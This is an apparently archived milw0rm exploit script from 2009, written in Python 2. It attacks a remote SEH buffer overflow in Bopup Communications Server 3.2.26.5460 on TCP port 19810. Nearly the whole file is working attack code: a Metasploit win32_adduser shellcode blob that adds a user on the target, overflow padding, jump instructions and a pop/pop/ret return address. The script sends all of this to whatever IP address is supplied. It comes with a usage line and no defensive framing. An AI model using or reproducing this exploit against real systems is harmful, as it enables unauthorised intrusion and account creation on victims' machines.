#!/usr/bin/python
#[*] Usage : python bopup.py [target_ip]
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : Bopup Communications Server (3.2.26.5460) Remote BOF Exploit (SEH)
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Refer	:	mu-b
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ)


import socket,sys,struct
from time import *

host = sys.argv[1]

def banner():
        print "\n[x] Bopup Communications Server Remote BOF Exploit (SEH)\n"
        print "[x] By: His0k4\n"
 
if len(sys.argv)!=2:
        banner()
        print "Usage: %s <ip>" %sys.argv[0]
        sys.exit(0)

# win32_adduser -  PASS=27 EXITFUNC=seh USER=dz Size=228 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
"\x44\x7A\x32\x37\x44\x7A\x32\x37\x29\xc9\x83\xe9\xcd\xd9\xee\xd9"
"\x74\x24\xf4\x5b\x81\x73\x13\x05\x16\xf2\x06\x83\xeb\xfc\xe2\xf4"
"\xf9\xfe\xb6\x06\x05\x16\x79\x43\x39\x9d\x8e\x03\x7d\x17\x1d\x8d"
"\x4a\x0e\x79\x59\x25\x17\x19\x4f\x8e\x22\x79\x07\xeb\x27\x32\x9f"
"\xa9\x92\x32\x72\x02\xd7\x38\x0b\x04\xd4\x19\xf2\x3e\x42\xd6\x02"
"\x70\xf3\x79\x59\x21\x17\x19\x60\x8e\x1a\xb9\x8d\x5a\x0a\xf3\xed"
"\x8e\x0a\x79\x07\xee\x9f\xae\x22\x01\xd5\xc3\xc6\x61\x9d\xb2\x36"
"\x80\xd6\x8a\x0a\x8e\x56\xfe\x8d\x75\x0a\x5f\x8d\x6d\x1e\x19\x0f"
"\x8e\x96\x42\x06\x05\x16\x79\x6e\x39\x49\xc3\xf0\x65\x40\x7b\xfe"
"\x86\xd6\x89\x56\x6d\xe6\x78\x02\x5a\x7e\x6a\xf8\x8f\x18\xa5\xf9"
"\xe2\x75\x9f\x62\x2b\x73\x8a\x63\x25\x39\x91\x26\x6b\x73\x86\x26"
"\x70\x65\x97\x74\x25\x72\x88\x26\x37\x21\xd2\x29\x44\x52\xb6\x26"
"\x23\x30\xd2\x68\x60\x62\xd2\x6a\x6a\x75\x93\x6a\x62\x64\x9d\x73"
"\x75\x36\xb3\x62\x68\x7f\x9c\x6f\x76\x62\x80\x67\x71\x79\x80\x75"
"\x25\x72\x88\x26\x2a\x57\xb6\x42\x05\x16\xf2\x06")


payload = '\x01\x00\x00\x00'
payload += '\x41'*(821-len(shellcode))
payload += shellcode
payload += '\x42'*27	#padding
payload += '\xE8\xFC\xFE\xFF\xFF' #Call back
payload += '\x43'*8	#padding, escaping from the \x00 monster :p
payload += '\xEB\xF1\xFF\xFF' #short jump
payload += '\xE0\x14\x40\x00' #p/p/r bcssrvc (universal)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((host,19810))
except:
	print "Can\'t connect to server!\n"
	sys.exit(0)

s.send(payload+'\r\n')
print("[+] Done!")
s.close()

# milw0rm.com [2009-06-29]
